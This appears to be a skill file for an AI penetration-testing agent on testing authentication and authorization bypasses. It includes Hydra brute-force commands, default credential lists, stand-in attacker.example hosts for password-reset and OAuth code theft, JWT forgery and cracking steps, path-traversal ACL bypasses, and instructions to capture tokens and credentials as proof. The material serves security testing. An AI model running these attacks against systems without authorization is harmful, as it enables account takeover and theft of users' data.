---
name: auth-bypass
description: Test for authentication and authorization flaws including credential attacks, session issues, and access control bypasses
origin: Vigil
---

# Authentication & Authorization Bypass

> **`vigil assess kali` audit flags:** use `--technique AUTH` (all auth-bypass variants — header spoofing, role drift, logic flaws, forced browsing — collapse to the AUTH class). Switch to `JWT` when attacking a JSON Web Token specifically.

## When to Activate

- Login/register/reset forms, protected resources, admin panels
- Token/session/API key auth, role-based access, JWT/OAuth

## Authentication Testing

### 1. Default/Weak Credentials
```
admin:admin  admin:password  admin:123456  root:root  root:toor  test:test  guest:guest
```
Check username enumeration: different errors for valid/invalid users, timing diffs, selective lockout.

### 2. Brute Force (Hydra)

Run via `vigil assess kali exec --technique AUTH --intent "brute-force login" --probe-kind payload --phase consume-test --timeout 300 -- hydra ...` so the run lands in the audit pipeline.
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-get /admin
hydra -l root -P passwords.txt target ssh -t 4
# Rate-limited: -t 1 -W 5
```

### 3. Password Reset Flaws
- Predictable/reusable/non-expiring tokens, token not tied to account
- Host header injection: `Host: attacker.example` in reset request
- Parameter pollution: `email=victim@mail.com&email=attacker@mail.com`

### 4. Session Management
- Session fixation: force token onto victim, use after auth
- Token analysis: collect 20+ tokens, check entropy/predictability/sequential patterns
- Invalidation: test logout, password change
- Cookie flags: check HttpOnly, Secure, SameSite, Domain/Path scope

### 5. MFA Bypass
- Direct navigation to post-auth pages, code brute-force (no rate limit), code reuse
- Response manipulation (`"success":false` → `true`), backup code enumeration
- MFA not enforced on all auth paths, disable without re-auth

## Authorization Testing

### 1. IDOR
```
GET /api/user/1001/profile → /api/user/1002/profile    # Horizontal
GET /invoice?id=5001 → ?id=5002
# param pollution: ?id=1001&id=1002, method swap: GET→PUT/DELETE
# Vertical: regular user → admin endpoints
```
Don't hand-roll the ID variants. Classify the captured ID and fire its intent-keyed set —
`neighbor`/`boundary` for horizontal access, `escalation` for vertical (admin/first-object) access:
```bash
vigil assess classify-payload 1001 --mutations    # sequential_id → 1002/1000/.., 0/-1/1, admin/root
vigil assess classify-payload "$UUID" --mutations  # uuid → ++last group, all-zeros, ...-000000000001
```
For deep IDOR work (split-brain body/route divergence, multi-tenant isolation) hand off to the
`idor-testing` / `split-brain-idor` skills, which own the full ID-mutation and confirmation flow.

### 2. Forced Browsing
```
/admin  /admin/dashboard  /console  /debug  /internal  /api/admin/users  /graphql
```
Check if 302 redirect body contains protected content (curl without -L).

### 3. HTTP Method Tampering
```
GET /admin/delete → 403, POST /admin/delete → 200
# Override headers: X-HTTP-Method-Override, X-Method-Override, X-Original-Method
```

### 4. Path Traversal for ACL Bypass
```
/admin→403  /ADMIN→200  /admin/→200  /./admin→200  /admin;.js→200
/%2fadmin→200  /admin%20→200  /admin..;/→200 (Tomcat/Spring)
```

### 5. JWT Attacks
```bash
# Decode: echo "HEADER_B64" | base64 -d
# None algorithm: {"alg":"none"}, remove signature → HEADER.PAYLOAD.
# Weak secret: hashcat -a 0 -m 16500 jwt.txt rockyou.txt
# Payload: change role/sub/exp claims
# Key injection: kid="../../dev/null" → sign with empty secret
# jku: point to attacker JWK set URL
jwt_tool TOKEN -T                  # Tamper
jwt_tool TOKEN -C -d wordlist.txt  # Crack
```

### 6. OAuth/SSO Flaws
- Open redirect in redirect_uri (steal auth code): `redirect_uri=https://attacker.example`
- Missing state param (CSRF), token leakage via Referer, scope escalation

### 7. Role/Privilege Manipulation
```
POST /register {"username":"test","password":"test","role":"admin"}
PUT /api/profile {"name":"test","role":"admin","is_staff":true}  # Mass assignment
# Trust headers: X-Forwarded-For: 127.0.0.1, X-Original-URL: /admin
```

## Methodology Checklist

All HTTP probing steps must go through `vigil assess kali exec --technique AUTH --intent "<purpose>" --probe-kind <kind> --phase consume-test --timeout <N> -- curl ...` (or the appropriate typed verb) so every request lands in the audit pipeline. Use `--probe-kind baseline` for control requests, `--probe-kind payload` for attack attempts, `--probe-kind exploit` for confirmed bypass demonstrations.

1. Map all auth endpoints (login, register, reset, logout, MFA, OAuth)
2. Create accounts at each privilege level
3. Test each privileged action with lower/no-auth sessions
4. Swap tokens between privilege levels
5. Test every object reference with other accounts' IDs
6. Check JWT/token security
7. Test session lifecycle: fixation, expiration, invalidation

## Fail-Open Testing

Authentication code that fails open executes the protected action despite returning an error
response. The client sees a 401/403, but the side effect (write, email, state change) still fires.

### Detection Methodology

1. **Identify state-changing endpoints** that require auth (POST/PUT/PATCH/DELETE)
2. **Send request without auth** (or with invalid auth)
3. **Check for the side effect** via a secondary read, even if the response was 401/403
4. **If side effect fired** → the endpoint fails open (the auth check doesn't `return` before the action)

### Checklist

- [ ] Test authenticated POST/PUT endpoints without session — does the write land despite 401 response?
- [ ] Test with expired/invalid token — check if the action executed before the auth error was returned
- [ ] Test authentication when backend auth service is slow: does timeout grant access?
- [ ] Send malformed auth tokens — does the app fail-open or fail-closed?
- [ ] Test with empty `Authorization` header vs missing `Authorization` header (different behavior?)
- [ ] Remove CSRF token entirely — does the request succeed? (fail-open CSRF)
- [ ] Test with invalid session cookie — does it create a new authenticated session?
- [ ] Check if rate limiter failure grants unlimited access instead of blocking
- [ ] After receiving 401/403 on a write endpoint, immediately read the resource — was it modified?
- [ ] Test async/webhook endpoints — auth failure may log but not prevent the queued action
- [ ] Check activity/audit logs after a 401 — if the action was logged, it likely executed

### Why This Matters

The common fail-open pattern in code:

```javascript
// VULNERABLE: auth check doesn't return on failure
app.post('/api/action', (req, res) => {
  if (!req.session.auth) {
    res.status(401).send('Unauthorized');
    // BUG: missing "return" here — execution continues
  }
  db.performAction(req.body);  // Executes even without auth
});
```

The tester sees 401 and moves on. The action still fires. The only way to detect this
from black-box is to check for the side effect after receiving the error response.

### Confirm via Side-Effect Verification

```bash
# Step 1: Attempt write without auth
curl -X POST https://target/api/logs \
  -H "Content-Type: application/json" \
  -d '{"message": "fail-open-test-marker-xyz"}' \
  -v
# Response: 401 Unauthorized

# Step 2: Check if the write landed (use valid auth for read)
curl https://target/api/logs?q=fail-open-test-marker-xyz \
  -H "Cookie: session=VALID_TOKEN"
# If the log entry exists → FAIL-OPEN CONFIRMED
```

## What to Record

- Auth endpoint, parameter, and bypass technique
- Before/after state showing unauthorized access (control request, bypassed request, and proof of privileged access)
- Tokens or credentials captured — confirming a bypass route exists is not enough; you must show the **attacker outcome** (e.g., the `alg:none` JWT was accepted and the forged token accessed the admin user list at `/api/admin/users` returning 1,200 accounts, the account lockout bypass allowed successful credential stuffing of 3 accounts from the breach list, the IDOR allowed reading another user's full profile including SSN and billing address, the forced-browse to `/admin/dashboard` loaded the authenticated admin panel with user management controls)
- Severity: Critical (account takeover, admin access) to High (privilege escalation, sensitive data) to Medium (enumeration-only)

## Extended Resources

- `agent/references/payloads/jwt-payloads.md` — alg:none, key confusion, JWK/kid injection, weak secret brute-force
